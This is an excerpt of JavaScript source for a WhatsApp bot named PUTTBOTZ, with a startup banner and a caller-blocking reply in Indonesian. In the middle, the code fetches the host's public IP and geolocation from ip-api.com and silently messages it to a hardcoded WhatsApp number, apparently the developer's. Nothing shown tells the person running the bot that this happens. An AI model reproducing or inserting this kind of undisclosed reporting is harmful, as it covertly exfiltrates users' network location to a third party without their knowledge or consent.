...
console.log(color(figlet.textSync(`${spc1}            PUTTBOTZ`, {
font: 'Standard',
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6285854721440@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Puttbotz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6285854721440?text=Assalamualaikum"}}})
...
call = calling[1].from
client.sendMessage(call, `*Maap ${client.user.name} Anda Telah Tlpn, Anda Akan Diblock*`, MessageType.text)
